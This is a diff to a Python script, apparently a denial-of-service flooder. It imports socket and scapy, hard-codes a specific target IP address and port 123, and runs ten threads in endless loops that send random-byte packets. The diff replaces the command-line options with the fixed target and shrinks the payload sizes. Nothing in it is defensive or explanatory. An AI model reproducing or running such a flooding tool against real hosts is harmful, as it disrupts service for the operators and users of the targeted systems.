@@ -2,22 +2,18 @@ import random
 import socket
 import threading
 import sys
-import argparse
 from scapy.all import *
 from multiprocessing.dummy import Pool as ThreadPool
 
-parser = argparse.ArgumentParser()
-parser.add_argument('-port', help = 'target port')
-parser.add_argument('-choice', help = 'user')
-args = parser.parse_args()
+
 
 ip = '82.200.161.178'
-port = int(args.port)
-choice = args.choice
+port = 123
+choice = '1'
 times = 10000000000
 threads = 10
 def run(a):
-	data = random._urandom(100*1024)
+	data = random._urandom(10*1024)
 	i = random.choice(("[/]","[__]","[/]"))
 	while True:
 		try:
@@ -30,7 +26,7 @@ def run(a):
 			print("[!] Error!!!")
 
 def run2():
-	data = random._urandom(16*10000000000)
+	data = random._urandom(16*1000000)
 	i = random.choice(("[+]","-","[*]"))
 	while True:
 		try:
